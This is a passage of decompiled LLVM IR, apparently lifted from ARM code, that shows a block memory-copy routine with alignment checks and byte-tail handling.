  %v0_18088 = phi i32 [ %v2_18070, %dec_label_pc_18080 ], [ %v2_1814c, %dec_label_pc_18154 ]
  %v1_18088 = add i32 %v0_18088, -8
  store i32 %v1_18088, i32* %r2.global-to-local, align 4
  %v3_18088 = sub i32 7, %v0_18088
  %v4_18088 = and i32 %v3_18088, %v0_18088
  %v5_18088 = icmp slt i32 %v4_18088, 0
  store i1 %v5_18088, i1* %cpsr_v.global-to-local, align 1
  %v6_18088 = icmp slt i32 %v1_18088, 0
  store i1 %v6_18088, i1* %cpsr_n.global-to-local, align 1
  %v7_18088 = icmp eq i32 %v0_18088, 8
  store i1 %v7_18088, i1* %cpsr_z.global-to-local, align 1
  %v2_1808c = xor i1 %v6_18088, %v5_18088
  br i1 %v2_1808c, label %dec_label_pc_180dc, label %dec_label_pc_18090

dec_label_pc_18090:                               ; preds = %dec_label_pc_18088
  %v1_18090 = add i32 %v0_18088, -28
  store i32 %v1_18090, i32* %r2.global-to-local, align 4
  %v3_18090 = sub i32 27, %v0_18088
  %v4_18090 = and i32 %v3_18090, %v1_18088
  %v5_18090 = icmp slt i32 %v4_18090, 0
  store i1 %v5_18090, i1* %cpsr_v.global-to-local, align 1
  %v6_18090 = icmp slt i32 %v1_18090, 0
  store i1 %v6_18090, i1* %cpsr_n.global-to-local, align 1
  %v7_18090 = icmp eq i32 %v1_18088, 20
  store i1 %v7_18090, i1* %cpsr_z.global-to-local, align 1
  %v2_18094 = xor i1 %v6_18090, %v5_18090
  br i1 %v2_18094, label %dec_label_pc_180c8, label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %dec_label_pc_18090
  %v0_18098 = load i32, i32* @r4, align 4
  store i32 %v0_18098, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1809c

dec_label_pc_1809c:                               ; preds = %dec_label_pc_1809c.dec_label_pc_1809c_crit_edge, %dec_label_pc_18098
  %v0_180a0 = phi i32 [ %v12_180a8, %dec_label_pc_1809c.dec_label_pc_1809c_crit_edge ], [ %v0_180a094, %dec_label_pc_18098 ]
  %v0_1809c = phi i32 [ %v0_1809c.pre, %dec_label_pc_1809c.dec_label_pc_1809c_crit_edge ], [ %v0_1809c93, %dec_label_pc_18098 ]
  %v1_1809c = inttoptr i32 %v0_1809c to i32*
  %v2_1809c = load i32, i32* %v1_1809c, align 4
  %v3_1809c = add i32 %v0_1809c, 4
  %v4_1809c = inttoptr i32 %v3_1809c to i32*
  %v5_1809c = load i32, i32* %v4_1809c, align 4
  store i32 %v5_1809c, i32* %r4.global-to-local, align 4
  %v6_1809c = add i32 %v0_1809c, 8
  %v7_1809c = inttoptr i32 %v6_1809c to i32*
  %v8_1809c = load i32, i32* %v7_1809c, align 4
  store i32 %v8_1809c, i32* %ip.global-to-local, align 4
  %v9_1809c = add i32 %v0_1809c, 12
  %v10_1809c = inttoptr i32 %v9_1809c to i32*
  %v11_1809c = load i32, i32* %v10_1809c, align 4
  store i32 %v11_1809c, i32* %lr.global-to-local, align 4
  %v12_1809c = add i32 %v0_1809c, 16
  store i32 %v12_1809c, i32* %r1.global-to-local, align 4
  %v1_180a0 = inttoptr i32 %v0_180a0 to i32*
  store i32 %v2_1809c, i32* %v1_180a0, align 4
  %v3_180a0 = add i32 %v0_180a0, 4
  %v4_180a0 = inttoptr i32 %v3_180a0 to i32*
  %v5_180a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_180a0, i32* %v4_180a0, align 4
  %v6_180a0 = add i32 %v0_180a0, 8
  %v7_180a0 = inttoptr i32 %v6_180a0 to i32*
  %v8_180a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_180a0, i32* %v7_180a0, align 4
  %v9_180a0 = add i32 %v0_180a0, 12
  %v10_180a0 = inttoptr i32 %v9_180a0 to i32*
  %v11_180a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_180a0, i32* %v10_180a0, align 4
  %v12_180a0 = add i32 %v0_180a0, 16
  store i32 %v12_180a0, i32* %r0.global-to-local, align 4
  %v0_180a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_180a4 = inttoptr i32 %v0_180a4 to i32*
  %v2_180a4 = load i32, i32* %v1_180a4, align 4
  store i32 %v2_180a4, i32* @r3, align 4
  %v3_180a4 = add i32 %v0_180a4, 4
  %v4_180a4 = inttoptr i32 %v3_180a4 to i32*
  %v5_180a4 = load i32, i32* %v4_180a4, align 4
  store i32 %v5_180a4, i32* %r4.global-to-local, align 4
  %v6_180a4 = add i32 %v0_180a4, 8
  %v7_180a4 = inttoptr i32 %v6_180a4 to i32*
  %v8_180a4 = load i32, i32* %v7_180a4, align 4
  store i32 %v8_180a4, i32* @ip, align 4
  %v9_180a4 = add i32 %v0_180a4, 12
  %v10_180a4 = inttoptr i32 %v9_180a4 to i32*
  %v11_180a4 = load i32, i32* %v10_180a4, align 4
  store i32 %v11_180a4, i32* %lr.global-to-local, align 4
  %v12_180a4 = add i32 %v0_180a4, 16
  store i32 %v12_180a4, i32* @r1, align 4
  %v1_180a8 = inttoptr i32 %v12_180a0 to i32*
  store i32 %v2_180a4, i32* %v1_180a8, align 4
  %v3_180a8 = add i32 %v0_180a0, 20
  %v4_180a8 = inttoptr i32 %v3_180a8 to i32*
  %v5_180a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_180a8, i32* %v4_180a8, align 4
  %v6_180a8 = add i32 %v0_180a0, 24
  %v7_180a8 = inttoptr i32 %v6_180a8 to i32*
  %v8_180a8 = load i32, i32* @ip, align 4
  store i32 %v8_180a8, i32* %v7_180a8, align 4
  %v9_180a8 = add i32 %v0_180a0, 28
  %v10_180a8 = inttoptr i32 %v9_180a8 to i32*
  %v11_180a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_180a8, i32* %v10_180a8, align 4
  %v12_180a8 = add i32 %v0_180a0, 32
  store i32 %v12_180a8, i32* @r0, align 4
  %v0_180ac = load i32, i32* %r2.global-to-local, align 4
  %v1_180ac = add i32 %v0_180ac, -32
  store i32 %v1_180ac, i32* %r2.global-to-local, align 4
  %v3_180ac = sub i32 31, %v0_180ac
  %v4_180ac = and i32 %v3_180ac, %v0_180ac
  %v5_180ac = icmp slt i32 %v4_180ac, 0
  %v6_180ac = icmp slt i32 %v1_180ac, 0
  %v2_180b0 = xor i1 %v6_180ac, %v5_180ac
  br i1 %v2_180b0, label %dec_label_pc_180b4, label %dec_label_pc_1809c.dec_label_pc_1809c_crit_edge

dec_label_pc_1809c.dec_label_pc_1809c_crit_edge:  ; preds = %dec_label_pc_1809c
  %v0_1809c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1809c

dec_label_pc_180b4:                               ; preds = %dec_label_pc_1809c
  %v1_180b4 = add i32 %v0_180ac, -16
  %v3_180b4 = add i32 %v0_180ac, 2147483616
  %v4_180b4 = and i32 %v1_180b4, %v3_180b4
  %v5_180b4 = icmp slt i32 %v4_180b4, 0
  store i1 %v5_180b4, i1* %cpsr_v.global-to-local, align 1
  %v6_180b4 = icmp slt i32 %v1_180b4, 0
  store i1 %v6_180b4, i1* %cpsr_n.global-to-local, align 1
  %v7_180b4 = icmp eq i32 %v1_180b4, 0
  store i1 %v7_180b4, i1* %cpsr_z.global-to-local, align 1
  %v2_180b8 = xor i1 %v6_180b4, %v5_180b4
  br i1 %v2_180b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_180b4
  %v3_180b8 = load i32, i32* @r1, align 4
  %v4_180b8 = inttoptr i32 %v3_180b8 to i32*
  %v5_180b8 = load i32, i32* %v4_180b8, align 4
  store i32 %v5_180b8, i32* @r3, align 4
  %v6_180b8 = add i32 %v3_180b8, 4
  %v7_180b8 = inttoptr i32 %v6_180b8 to i32*
  %v8_180b8 = load i32, i32* %v7_180b8, align 4
  store i32 %v8_180b8, i32* %r4.global-to-local, align 4
  %v9_180b8 = add i32 %v3_180b8, 8
  %v10_180b8 = inttoptr i32 %v9_180b8 to i32*
  %v11_180b8 = load i32, i32* %v10_180b8, align 4
  store i32 %v11_180b8, i32* @ip, align 4
  %v12_180b8 = add i32 %v3_180b8, 12
  %v13_180b8 = inttoptr i32 %v12_180b8 to i32*
  %v14_180b8 = load i32, i32* %v13_180b8, align 4
  store i32 %v14_180b8, i32* %lr.global-to-local, align 4
  %v15_180b8 = add i32 %v3_180b8, 16
  store i32 %v15_180b8, i32* @r1, align 4
  %v4_180bc = inttoptr i32 %v12_180a8 to i32*
  store i32 %v5_180b8, i32* %v4_180bc, align 4
  %v6_180bc = add i32 %v0_180a0, 36
  %v7_180bc = inttoptr i32 %v6_180bc to i32*
  %v8_180bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_180bc, i32* %v7_180bc, align 4
  %v9_180bc = add i32 %v0_180a0, 40
  %v10_180bc = inttoptr i32 %v9_180bc to i32*
  %v11_180bc = load i32, i32* @ip, align 4
  store i32 %v11_180bc, i32* %v10_180bc, align 4
  %v12_180bc = add i32 %v0_180a0, 44
  %v13_180bc = inttoptr i32 %v12_180bc to i32*
  %v14_180bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_180bc, i32* %v13_180bc, align 4
  %v15_180bc = add i32 %v0_180a0, 48
  store i32 %v15_180bc, i32* @r0, align 4
  %v3_180c0 = load i32, i32* %r2.global-to-local, align 4
  %v4_180c0 = add i32 %v3_180c0, -16
  store i32 %v4_180c0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_180b4, %bb136
  %v3_180d0102111 = phi i32 [ %v15_180bc, %bb136 ], [ %v12_180a8, %dec_label_pc_180b4 ]
  %v0_180c8.pre = phi i32 [ %v4_180c0, %bb136 ], [ %v1_180ac, %dec_label_pc_180b4 ]
  %v2_180c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_180c4, i32* @r4, align 4
  br label %dec_label_pc_180c8

dec_label_pc_180c8:                               ; preds = %dec_label_pc_18090, %bb137
  %v3_180d0101 = phi i32 [ %v0_180a094, %dec_label_pc_18090 ], [ %v3_180d0102111, %bb137 ]
  %v0_180c8 = phi i32 [ %v1_18090, %dec_label_pc_18090 ], [ %v0_180c8.pre, %bb137 ]
  %v1_180c8 = add i32 %v0_180c8, 20
  store i32 %v1_180c8, i32* %r2.global-to-local, align 4
  %v3_180c8 = sub i32 0, %v0_180c8
  %v4_180c8 = and i32 %v1_180c8, %v3_180c8
  %v5_180c8 = icmp slt i32 %v4_180c8, 0
  store i1 %v5_180c8, i1* %cpsr_v.global-to-local, align 1
  %v6_180c8 = icmp slt i32 %v1_180c8, 0
  store i1 %v6_180c8, i1* %cpsr_n.global-to-local, align 1
  %v7_180c8 = icmp eq i32 %v1_180c8, 0
  store i1 %v7_180c8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_180cc

dec_label_pc_180cc:                               ; preds = %.thread115, %dec_label_pc_180c8
  %v0_180dc.pre157 = phi i32 [ %v0_180dc.pre, %.thread115 ], [ %v1_180c8, %dec_label_pc_180c8 ]
  %v3_180d0 = phi i32 [ %v3_180d099116, %.thread115 ], [ %v3_180d0101, %dec_label_pc_180c8 ]
  %v1_180d4 = phi i1 [ %v1_180d8, %.thread115 ], [ %v5_180c8, %dec_label_pc_180c8 ]
  %v0_180d4 = phi i1 [ %v0_180d8, %.thread115 ], [ %v6_180c8, %dec_label_pc_180c8 ]
  %v2_180cc = xor i1 %v1_180d4, %v0_180d4
  br i1 %v2_180cc, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_180cc
  %v3_180cc = load i32, i32* @r1, align 4
  %v4_180cc = inttoptr i32 %v3_180cc to i32*
  %v5_180cc = load i32, i32* %v4_180cc, align 4
  store i32 %v5_180cc, i32* @r3, align 4
  %v6_180cc = add i32 %v3_180cc, 4
  %v7_180cc = inttoptr i32 %v6_180cc to i32*
  %v8_180cc = load i32, i32* %v7_180cc, align 4
  store i32 %v8_180cc, i32* @ip, align 4
  %v9_180cc = add i32 %v3_180cc, 8
  %v10_180cc = inttoptr i32 %v9_180cc to i32*
  %v11_180cc = load i32, i32* %v10_180cc, align 4
  store i32 %v11_180cc, i32* %lr.global-to-local, align 4
  %v12_180cc = add i32 %v3_180cc, 12
  store i32 %v12_180cc, i32* @r1, align 4
  %v4_180d0 = inttoptr i32 %v3_180d0 to i32*
  store i32 %v5_180cc, i32* %v4_180d0, align 4
  %v6_180d0 = add i32 %v3_180d0, 4
  %v7_180d0 = inttoptr i32 %v6_180d0 to i32*
  %v8_180d0 = load i32, i32* @ip, align 4
  store i32 %v8_180d0, i32* %v7_180d0, align 4
  %v9_180d0 = add i32 %v3_180d0, 8
  %v10_180d0 = inttoptr i32 %v9_180d0 to i32*
  %v11_180d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_180d0, i32* %v10_180d0, align 4
  %v12_180d0 = add i32 %v3_180d0, 12
  store i32 %v12_180d0, i32* @r0, align 4
  %v3_180d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_180d4 = add i32 %v3_180d4, -12
  store i32 %v4_180d4, i32* %r2.global-to-local, align 4
  %v6_180d4 = sub i32 11, %v3_180d4
  %v7_180d4 = and i32 %v6_180d4, %v3_180d4
  %v8_180d4 = icmp slt i32 %v7_180d4, 0
  store i1 %v8_180d4, i1* %cpsr_v.global-to-local, align 1
  %v9_180d4 = icmp slt i32 %v4_180d4, 0
  store i1 %v9_180d4, i1* %cpsr_n.global-to-local, align 1
  %v10_180d4 = icmp eq i32 %v3_180d4, 12
  store i1 %v10_180d4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_180cc, %bb138
  %v0_180dc.pre = phi i32 [ %v4_180d4, %bb138 ], [ %v0_180dc.pre157, %dec_label_pc_180cc ]
  %v3_180d099116 = phi i32 [ %v12_180d0, %bb138 ], [ %v3_180d0, %dec_label_pc_180cc ]
  %v1_180d8 = phi i1 [ %v8_180d4, %bb138 ], [ %v1_180d4, %dec_label_pc_180cc ]
  %v0_180d8 = phi i1 [ %v9_180d4, %bb138 ], [ %v0_180d4, %dec_label_pc_180cc ]
  %v2_180d8 = xor i1 %v1_180d8, %v0_180d8
  br i1 %v2_180d8, label %dec_label_pc_180dc, label %dec_label_pc_180cc

dec_label_pc_180dc:                               ; preds = %.thread115, %dec_label_pc_18088
  %v4_180ec = phi i32 [ %v0_180a094, %dec_label_pc_18088 ], [ %v3_180d099116, %.thread115 ]
  %v0_180dc = phi i32 [ %v1_18088, %dec_label_pc_18088 ], [ %v0_180dc.pre, %.thread115 ]
  %v1_180dc = add i32 %v0_180dc, 8
  store i32 %v1_180dc, i32* %r2.global-to-local, align 4
  %v3_180dc = sub i32 0, %v0_180dc
  %v4_180dc = and i32 %v1_180dc, %v3_180dc
  %v5_180dc = icmp slt i32 %v4_180dc, 0
  store i1 %v5_180dc, i1* %cpsr_v.global-to-local, align 1
  %v6_180dc = icmp slt i32 %v1_180dc, 0
  store i1 %v6_180dc, i1* %cpsr_n.global-to-local, align 1
  %v7_180dc = icmp eq i32 %v1_180dc, 0
  store i1 %v7_180dc, i1* %cpsr_z.global-to-local, align 1
  %v2_180e0 = xor i1 %v6_180dc, %v5_180dc
  br i1 %v2_180e0, label %bb140, label %dec_label_pc_180e4

dec_label_pc_180e4:                               ; preds = %dec_label_pc_180dc
  %v1_180e4 = add i32 %v0_180dc, 4
  store i32 %v1_180e4, i32* %r2.global-to-local, align 4
  %v3_180e4 = sub i32 -5, %v0_180dc
  %v4_180e4 = and i32 %v3_180e4, %v1_180dc
  %v5_180e4 = icmp slt i32 %v4_180e4, 0
  store i1 %v5_180e4, i1* %cpsr_v.global-to-local, align 1
  %v6_180e4 = icmp slt i32 %v1_180e4, 0
  store i1 %v6_180e4, i1* %cpsr_n.global-to-local, align 1
  %v7_180e4 = icmp eq i32 %v1_180dc, 4
  store i1 %v7_180e4, i1* %cpsr_z.global-to-local, align 1
  %v2_180e8 = xor i1 %v6_180e4, %v5_180e4
  %v3_180e8 = load i32, i32* @r1, align 4
  %v4_180e8 = inttoptr i32 %v3_180e8 to i32*
  %v5_180e8 = load i32, i32* %v4_180e8, align 4
  store i32 %v5_180e8, i32* @r3, align 4
  %v7_180e8 = add i32 %v3_180e8, 4
  br i1 %v2_180e8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_180e4
  store i32 %v7_180e8, i32* @r1, align 4
  %v5_180ec = inttoptr i32 %v4_180ec to i32*
  store i32 %v5_180e8, i32* %v5_180ec, align 4
  %v6_180ec = load i32, i32* @r0, align 4
  %v7_180ec = add i32 %v6_180ec, 4
  store i32 %v7_180ec, i32* @r0, align 4
  %v0_180fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_180e4
  %v7_180f0 = inttoptr i32 %v7_180e8 to i32*
  %v8_180f0 = load i32, i32* %v7_180f0, align 4
  store i32 %v8_180f0, i32* @ip, align 4
  %v9_180f0 = add i32 %v3_180e8, 8
  store i32 %v9_180f0, i32* @r1, align 4
  %v4_180f4 = inttoptr i32 %v4_180ec to i32*
  store i32 %v5_180e8, i32* %v4_180f4, align 4
  %v6_180f4 = add i32 %v4_180ec, 4
  %v7_180f4 = inttoptr i32 %v6_180f4 to i32*
  %v8_180f4 = load i32, i32* @ip, align 4
  store i32 %v8_180f4, i32* %v7_180f4, align 4
  %v9_180f4 = add i32 %v4_180ec, 8
  store i32 %v9_180f4, i32* @r0, align 4
  %v3_180f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_180f8 = add i32 %v3_180f8, -4
  store i32 %v4_180f8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_180dc, %bb, %dec_label_pc_182ac, %dec_label_pc_18240, %dec_label_pc_181d4, %bb139
  %v0_180fc = phi i32 [ %v0_180fc.pre, %.thread122 ], [ %v2_1814c, %.thread128 ], [ %v1_180dc, %dec_label_pc_180dc ], [ %v2_18070, %bb ], [ %v0_180fc61, %dec_label_pc_182ac ], [ %v0_180fc60, %dec_label_pc_18240 ], [ %v0_180fc59, %dec_label_pc_181d4 ], [ %v4_180f8, %bb139 ]
  %v1_180fc = add i32 %v0_180fc, 4
  store i32 %v1_180fc, i32* %r2.global-to-local, align 4
  %v3_180fc = sub i32 0, %v0_180fc
  %v4_180fc = and i32 %v1_180fc, %v3_180fc
  %v5_180fc = icmp slt i32 %v4_180fc, 0
  store i1 %v5_180fc, i1* %cpsr_v.global-to-local, align 1
  %v6_180fc = icmp slt i32 %v1_180fc, 0
  store i1 %v6_180fc, i1* %cpsr_n.global-to-local, align 1
  %v7_180fc = icmp eq i32 %v1_180fc, 0
  store i1 %v7_180fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180fc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_18104.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_18100 = load i8*, i8** %stack_var_-8, align 4
  %v4_18100 = ptrtoint i8* %v3_18100 to i32
  store i32 %v4_18100, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_18104 = phi i32 [ %v0_18104.pre, %bb140.bb142_crit_edge ], [ %v8_1806c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_180fc, i32 %v0_18104)
  %v0_18108 = load i32, i32* %r2.global-to-local, align 4
  %v1_18108 = add i32 %v0_18108, -2
  %v3_18108 = sub i32 1, %v0_18108
  %v4_18108 = and i32 %v3_18108, %v0_18108
  %v5_18108 = icmp slt i32 %v4_18108, 0
  store i1 %v5_18108, i1* %cpsr_v.global-to-local, align 1
  %v6_18108 = icmp slt i32 %v1_18108, 0
  store i1 %v6_18108, i1* %cpsr_n.global-to-local, align 1
  %v7_18108 = icmp eq i32 %v0_18108, 2
  store i1 %v7_18108, i1* %cpsr_z.global-to-local, align 1
  %v0_1810c = load i32, i32* @r1, align 4
  %v1_1810c = inttoptr i32 %v0_1810c to i8*
  %v2_1810c = load i8, i8* %v1_1810c, align 1
  %v5_1810c = add i32 %v0_1810c, 1
  store i32 %v5_1810c, i32* %r1.global-to-local, align 4
  %v2_18110 = load i32, i32* @r0, align 4
  %v3_18110 = inttoptr i32 %v2_18110 to i8*
  store i8 %v2_1810c, i8* %v3_18110, align 1
  %v4_18110 = load i32, i32* @r0, align 4
  %v5_18110 = add i32 %v4_18110, 1
  store i32 %v5_18110, i32* %r0.global-to-local, align 4
  %v0_18114 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18114 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18114 = xor i1 %v0_18114, %v1_18114
  br i1 %v2_18114, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_18114 = load i32, i32* %r1.global-to-local, align 4
  %v4_18114 = inttoptr i32 %v3_18114 to i8*
  %v5_18114 = load i8, i8* %v4_18114, align 1
  %v8_18114 = add i32 %v3_18114, 1
  store i32 %v8_18114, i32* %r1.global-to-local, align 4
  %v6_18118 = inttoptr i32 %v5_18110 to i8*
  store i8 %v5_18114, i8* %v6_18118, align 1
  %v7_18118 = load i32, i32* %r0.global-to-local, align 4
  %v8_18118 = add i32 %v7_18118, 1
  store i32 %v8_18118, i32* %r0.global-to-local, align 4
  %v1_1811c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1811c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_18120 = phi i32 [ %v8_18118, %bb143 ], [ %v5_18110, %bb142 ]
  %v2_18120 = phi i1 [ %v2_1811c.pre, %bb143 ], [ %v1_18114, %bb142 ]
  %v1_18120 = phi i1 [ %v1_1811c.pre, %bb143 ], [ %v0_18114, %bb142 ]
  %v0_1811c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1811c = xor i1 %v2_18120, %v1_18120
  %v4_1811c = or i1 %v0_1811c, %v3_1811c
  br i1 %v4_1811c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1811c = load i32, i32* %r1.global-to-local, align 4
  %v6_1811c = inttoptr i32 %v5_1811c to i8*
  %v7_1811c = load i8, i8* %v6_1811c, align 1
  %v10_1811c = add i32 %v5_1811c, 1
  store i32 %v10_1811c, i32* %r1.global-to-local, align 4
  %v8_18120 = inttoptr i32 %v7_18120 to i8*
  store i8 %v7_1811c, i8* %v8_18120, align 1
  %v9_18120 = load i32, i32* %r0.global-to-local, align 4
  %v10_18120 = add i32 %v9_18120, 1
  store i32 %v10_18120, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_18124 = load i8*, i8** %stack_var_-8, align 4
  %v3_18124 = ptrtoint i8* %v2_18124 to i32
  store i32 %v3_18124, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1806c)
  %v0_1812c.pre = load i32, i32* @ip, align 4
  %v0_18134.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_18138.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %dec_label_pc_18078, %.thread126
  %v2_18138 = phi i32 [ %v1_18060, %dec_label_pc_18078 ], [ %v2_18138.pre, %.thread126 ]
  %v0_18134 = phi i32 [ %v0_18060, %dec_label_pc_18078 ], [ %v0_18134.pre, %.thread126 ]
  %v0_1812c = phi i32 [ %v1_18078, %dec_label_pc_18078 ], [ %v0_1812c.pre, %.thread126 ]
  %v1_1812c = sub i32 4, %v0_1812c
  store i32 %v1_1812c, i32* @ip, align 4
  %v1_18130 = add i32 %v1_1812c, -2
  %v3_18130 = sub i32 1, %v1_1812c
  %v4_18130 = and i32 %v3_18130, %v1_1812c
  %v5_18130 = icmp slt i32 %v4_18130, 0
  store i1 %v5_18130, i1* %cpsr_v.global-to-local, align 1
  %v6_18130 = icmp slt i32 %v1_18130, 0
  store i1 %v6_18130, i1* %cpsr_n.global-to-local, align 1
  %v7_18130 = icmp eq i32 %v1_1812c, 2
  store i1 %v7_18130, i1* %cpsr_z.global-to-local, align 1
  %v1_18134 = inttoptr i32 %v0_18134 to i8*
  %v2_18134 = load i8, i8* %v1_18134, align 1
  %v3_18134 = zext i8 %v2_18134 to i32
  store i32 %v3_18134, i32* @r3, align 4
  %v5_18134 = add i32 %v0_18134, 1
  store i32 %v5_18134, i32* @r1, align 4
  %v3_18138 = inttoptr i32 %v2_18138 to i8*
  store i8 %v2_18134, i8* %v3_18138, align 1
  %v4_18138 = load i32, i32* @r0, align 4
  %v5_18138 = add i32 %v4_18138, 1
  store i32 %v5_18138, i32* @r0, align 4
  %v0_1813c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1813c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1813c = xor i1 %v0_1813c, %v1_1813c
  br i1 %v2_1813c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1812c
  %v3_1813c = load i32, i32* @r1, align 4
  %v4_1813c = inttoptr i32 %v3_1813c to i8*
  %v5_1813c = load i8, i8* %v4_1813c, align 1
  %v6_1813c = zext i8 %v5_1813c to i32
  store i32 %v6_1813c, i32* @r3, align 4
  %v8_1813c = add i32 %v3_1813c, 1
  store i32 %v8_1813c, i32* @r1, align 4
  %v6_18140 = inttoptr i32 %v5_18138 to i8*
  store i8 %v5_1813c, i8* %v6_18140, align 1
  %v7_18140 = load i32, i32* @r0, align 4
  %v8_18140 = add i32 %v7_18140, 1
  store i32 %v8_18140, i32* @r0, align 4
  %v1_18144.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18144.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1812c, %bb145
  %v7_18148 = phi i32 [ %v8_18140, %bb145 ], [ %v5_18138, %dec_label_pc_1812c ]
  %v2_18148 = phi i1 [ %v2_18144.pre, %bb145 ], [ %v1_1813c, %dec_label_pc_1812c ]
  %v1_18148 = phi i1 [ %v1_18144.pre, %bb145 ], [ %v0_1813c, %dec_label_pc_1812c ]
  %v0_18144 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18144 = xor i1 %v2_18148, %v1_18148
  %v4_18144 = or i1 %v0_18144, %v3_18144
  br i1 %v4_18144, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18144 = load i32, i32* @r1, align 4
  %v6_18144 = inttoptr i32 %v5_18144 to i8*
  %v7_18144 = load i8, i8* %v6_18144, align 1
  %v8_18144 = zext i8 %v7_18144 to i32
  store i32 %v8_18144, i32* @r3, align 4
  %v10_18144 = add i32 %v5_18144, 1
  store i32 %v10_18144, i32* @r1, align 4
  %v8_18148 = inttoptr i32 %v7_18148 to i8*
  store i8 %v7_18144, i8* %v8_18148, align 1
  %v9_18148 = load i32, i32* @r0, align 4
  %v10_18148 = add i32 %v9_18148, 1
  store i32 %v10_18148, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1827c77 = phi i32 [ %v10_18148, %bb146 ], [ %v7_18148, %.thread127 ]
  %v0_1814c = load i32, i32* %r2.global-to-local, align 4
  %v1_1814c = load i32, i32* @ip, align 4
  %v2_1814c = sub i32 %v0_1814c, %v1_1814c
  store i32 %v2_1814c, i32* %r2.global-to-local, align 4
  %v4_1814c = xor i32 %v1_1814c, %v0_1814c
  %v5_1814c = xor i32 %v2_1814c, %v0_1814c
  %v6_1814c = and i32 %v5_1814c, %v4_1814c
  %v7_1814c = icmp slt i32 %v6_1814c, 0
  store i1 %v7_1814c, i1* %cpsr_v.global-to-local, align 1
  %v8_1814c = icmp slt i32 %v2_1814c, 0
  store i1 %v8_1814c, i1* %cpsr_n.global-to-local, align 1
  %v9_1814c = icmp eq i32 %v0_1814c, %v1_1814c
  store i1 %v9_1814c, i1* %cpsr_z.global-to-local, align 1
  %v2_18150 = xor i1 %v8_1814c, %v7_1814c
  br i1 %v2_18150, label %bb140, label %dec_label_pc_18154

dec_label_pc_18154:                               ; preds = %.thread128
  %v0_18154 = load i32, i32* @r1, align 4
  %v1_18154 = urem i32 %v0_18154, 4
  store i32 %v1_18154, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18154 = icmp eq i32 %v1_18154, 0
  store i1 %v2_18154, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18154 to i2
  br i1 %v2_18154, label %dec_label_pc_18088, label %dec_label_pc_1815c

dec_label_pc_1815c:                               ; preds = %dec_label_pc_18080, %dec_label_pc_18154
  %v0_1827c76 = phi i32 [ %v1_18060, %dec_label_pc_18080 ], [ %v0_1827c77, %dec_label_pc_18154 ]
  %v0_181e4 = phi i32 [ %v2_18070, %dec_label_pc_18080 ], [ %v2_1814c, %dec_label_pc_18154 ]
  %v0_18164.off0 = phi i2 [ %extract.t, %dec_label_pc_18080 ], [ %extract.t131, %dec_label_pc_18154 ]
  %v0_1815c = phi i32 [ %v0_18060, %dec_label_pc_18080 ], [ %v0_18154, %dec_label_pc_18154 ]
  %v1_1815c = and i32 %v0_1815c, -4
  store i32 %v1_1815c, i32* %r1.global-to-local, align 4
  %v1_18160 = inttoptr i32 %v1_1815c to i32*
  %v2_18160 = load i32, i32* %v1_18160, align 4
  store i32 %v2_18160, i32* %lr.global-to-local, align 4
  %v4_18160 = add i32 %v1_1815c, 4
  store i32 %v4_18160, i32* %r1.global-to-local, align 4
  %v1_181dc = add i32 %v0_181e4, -12
  %v3_181dc = sub i32 11, %v0_181e4
